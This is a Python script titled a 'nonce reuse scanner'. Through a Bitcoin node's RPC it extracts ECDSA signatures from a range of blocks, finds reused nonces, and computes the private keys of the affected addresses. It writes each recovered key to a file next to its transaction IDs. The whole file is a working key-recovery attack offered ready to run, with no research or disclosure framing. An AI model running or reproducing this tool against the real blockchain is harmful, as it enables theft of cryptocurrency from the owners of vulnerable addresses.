#!/usr/bin/env python3
"""
FULL AUTOMATIC BITCOIN NONCE REUSE SCANNER
LEGACY P2PKH - CROSS-TRANSACTION - FULL BLOCK RANGE - BULLETPROOF
"""

import requests
import base64
import time
import hashlib
import binascii
import struct
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------

RPC_USER = 'bitcoin_user'
RPC_PASSWORD = 'your_secure_password_123'
RPC_PORT = 8332
RPC_HOST = '127.0.0.1'

MAX_RETRIES = 1
RETRY_DELAY = 0.2
MAX_WORKERS = 8

session_lock = Lock()
sessions = {}

# ----------------------------------------------------------------------
# Bitcoin RPC Connection
# ----------------------------------------------------------------------

def get_session():
    import threading
    thread_id = threading.current_thread().ident
    with session_lock:
        if thread_id not in sessions:
            sessions[thread_id] = requests.Session()
            adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
            sessions[thread_id].mount('http://', adapter)
        return sessions[thread_id]

def cleanup_sessions():
    with session_lock:
        for session in sessions.values():
            session.close()
        sessions.clear()

def rpc_request(method, params=None, retry_count=0):
    session = get_session()
    url = f'http://{RPC_HOST}:{RPC_PORT}/'
    headers = {'content-type': 'application/json'}
    payload = {"method": method, "params": params or [], "jsonrpc": "2.0", "id": 0}
    auth = base64.b64encode(f"{RPC_USER}:{RPC_PASSWORD}".encode()).decode()
    try:
        response = session.post(url, json=payload, headers={**headers, "Authorization": f"Basic {auth}"}, timeout=20)
        response.raise_for_status()
        return response.json()['result']
    except Exception as e:
        if retry_count < MAX_RETRIES:
            time.sleep(RETRY_DELAY)
            return rpc_request(method, params, retry_count + 1)
        else:
            raise e

# ----------------------------------------------------------------------
# Cryptography
# ----------------------------------------------------------------------

def double_sha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def parse_der(sig_hex):
    data = bytes.fromhex(sig_hex)
    if data[0] != 0x30:
        raise ValueError("Invalid DER prefix")
    r_len = data[3]
    r_bytes = data[4:4+r_len]
    r = int.from_bytes(r_bytes, 'big')
    s_start = 4 + r_len
    s_len = data[s_start + 1]
    s_bytes = data[s_start+2:s_start+2+s_len]
    s = int.from_bytes(s_bytes, 'big')
    return r, s

class ECDSAAttack:
    def __init__(self):
        self.n = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)

    def mod_inverse(self, a, n):
        return pow(a, -1, n)

def compute_sighash(txid, input_index):
    tx = rpc_request('getrawtransaction', [txid, True])
    version = struct.pack('<I', tx['version'])
    locktime = struct.pack('<I', tx.get('locktime', 0))
    vin = tx['vin']
    inputs_serialized = b''
    for idx, vin_item in enumerate(vin):
        prev_txid = bytes.fromhex(vin_item['txid'])[::-1]
        vout = struct.pack('<I', vin_item['vout'])
        sequence = struct.pack('<I', vin_item.get('sequence', 0xffffffff))
        if idx == input_index:
            prev_tx = rpc_request('getrawtransaction', [vin_item['txid'], True])
            prev_output = prev_tx['vout'][vin_item['vout']]
            script_pubkey_hex = prev_output['scriptPubKey']['hex']
            script_bytes = bytes.fromhex(script_pubkey_hex)
            script_len = varint(len(script_bytes))
        else:
            script_bytes = b''
            script_len = varint(0)
        inputs_serialized += prev_txid + vout + script_len + script_bytes + sequence
    input_count = varint(len(vin))
    vout_list = tx['vout']
    output_serialized = b''
    for output in vout_list:
        value_satoshis = int(output['value'] * 1e8)
        value = struct.pack('<Q', value_satoshis)
        spk_bytes = bytes.fromhex(output['scriptPubKey']['hex'])
        spk_len = varint(len(spk_bytes))
        output_serialized += value + spk_len + spk_bytes
    output_count = varint(len(vout_list))
    preimage = version + input_count + inputs_serialized + output_count + output_serialized + locktime + struct.pack('<I', 1)
    sighash = double_sha256(preimage)
    return sighash

def varint(n):
    if n < 0xfd:
        return struct.pack('<B', n)
    elif n <= 0xffff:
        return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', n)
    else:
        return b'\xff' + struct.pack('<Q', n)

# ----------------------------------------------------------------------
# Script Parser
# ----------------------------------------------------------------------

def extract_signature(script_sig_hex):
    script_bytes = bytes.fromhex(script_sig_hex)
    offset = 0
    while offset < len(script_bytes):
        push_len = script_bytes[offset]
        offset += 1
        if push_len == 0:
            continue
        if offset + push_len > len(script_bytes):
            break
        data = script_bytes[offset:offset+push_len]
        offset += push_len
        if data[0] == 0x30:
            return data[:-1].hex()
    raise ValueError("Valid signature not found")

# ----------------------------------------------------------------------
# Main Scanner Logic
# ----------------------------------------------------------------------

def scan_block(block_height):
    block_hash = rpc_request('getblockhash', [block_height])
    block = rpc_request('getblock', [block_hash, 2])
    signatures = []
    for tx in block['tx']:
        txid = tx['txid']
        for idx, vin in enumerate(tx['vin']):
            if 'scriptSig' not in vin:
                continue
            try:
                sig_der = extract_signature(vin['scriptSig']['hex'])
                r, s = parse_der(sig_der)
                signatures.append({
                    'r': r,
                    's': s,
                    'sig': sig_der,
                    'txid': txid,
                    'input_index': idx
                })
            except:
                continue
    return signatures

def full_scan(start_block, end_block):
    print(f"Scanning blocks {start_block} to {end_block}...")
    all_sigs = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(scan_block, h): h for h in range(start_block, end_block+1)}
        for future in as_completed(futures):
            sigs = future.result()
            all_sigs.extend(sigs)
            print(f"Block {futures[future]}: {len(sigs)} signatures")
    print("\nCompleted signature extraction.")
    find_reuse(all_sigs)

def find_reuse(all_sigs):
    print("\nSearching for reused nonces...")
    seen = {}
    pairs = []
    for sig in all_sigs:
        r = sig['r']
        if r not in seen:
            seen[r] = sig
        else:
            pairs.append( (seen[r], sig) )
    print(f"Found {len(pairs)} reused nonce pairs.")
    attack = ECDSAAttack()
    with open('legacy_scan_output.txt', 'w', encoding='utf-8') as out:
        for pair in pairs:
            sig1, sig2 = pair
            try:
                if sig1['r'] != sig2['r']:
                    continue
                s1 = sig1['s']
                s2 = sig2['s']
                z1 = int.from_bytes(compute_sighash(sig1['txid'], sig1['input_index']), 'big')
                z2 = int.from_bytes(compute_sighash(sig2['txid'], sig2['input_index']), 'big')
                s_diff = (s1 - s2) % attack.n
                if s_diff == 0:
                    continue
                s_inv = attack.mod_inverse(s_diff, attack.n)
                z_diff = (z1 - z2) % attack.n
                k = (z_diff * s_inv) % attack.n
                r_inv = attack.mod_inverse(sig1['r'], attack.n)
                priv = (r_inv * ((s1 * k - z1) % attack.n)) % attack.n
                priv_hex = hex(priv)[2:].zfill(64)
                out.write(f"✅ Private Key Recovered: {priv_hex}\n")
                out.write(f"Reused Nonce R: {hex(sig1['r'])[2:].zfill(64)}\n")
                out.write(f"TX1: {sig1['txid']} Input: {sig1['input_index']}\n")
                out.write(f"TX2: {sig2['txid']} Input: {sig2['input_index']}\n\n")
            except Exception as e:
                out.write(f"Error extracting key: {e}\n")

# ----------------------------------------------------------------------
# Entry Point
# ----------------------------------------------------------------------

if __name__ == "__main__":
    try:
        start = int(input("Enter start block: ").strip())
        end = int(input("Enter end block: ").strip())
        full_scan(start, end)
    finally:
        cleanup_sessions()
